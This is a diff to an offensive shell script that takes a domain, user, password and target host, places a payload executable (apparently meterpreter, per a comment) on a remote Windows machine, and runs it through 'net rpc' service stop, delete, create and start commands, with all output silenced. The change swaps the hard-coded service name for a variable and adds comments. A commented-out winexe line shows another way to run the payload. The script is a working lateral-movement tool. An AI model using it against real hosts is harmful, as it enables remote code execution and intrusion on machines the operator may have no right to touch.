@@ -10,7 +10,7 @@ HOST=$4
 PAYLOAD_32="payload_32.exe"
 PAYLOAD_64="payload_64.exe"
 PAYLOAD=""
-
+SERVICE_NAME="servicex"
 #Construct credentials
 CREDS="$DOMAIN\\$USER%$PASS"
 
@@ -37,8 +37,12 @@ echo [+] Running $PAYLOAD on $HOST
 #winexe //$HOST -U "$CREDS" cmd\ /c\ c:\\$PAYLOAD
 
 #Using RPC ( meterpreter dies if not migrated right after probably due to the way services work need to look into it )
-net rpc -I $HOST -U "$CREDS" service stop tito > /dev/null 2>&1
-net rpc -I $HOST -U "$CREDS" service delete tito > /dev/null 2>&1
-net rpc -I $HOST -U "$CREDS" service create tito tito C:\\$PAYLOAD > /dev/null 2>&1
-net rpc -I $HOST -U "$CREDS" service start tito > /dev/null 2>&1
+
+#First, stop and delete possible previous instances of the service.
+net rpc -I $HOST -U "$CREDS" service stop $SERVICE_NAME > /dev/null 2>&1
+net rpc -I $HOST -U "$CREDS" service delete $SERVICE_NAME > /dev/null 2>&1
+
+#Second, create and run a new service using the uploaded payload
+net rpc -I $HOST -U "$CREDS" service create $SERVICE_NAME $SERVICE_NAME C:\\$PAYLOAD > /dev/null 2>&1
+net rpc -I $HOST -U "$CREDS" service start $SERVICE_NAME > /dev/null 2>&1
 echo [+] Done on $HOST
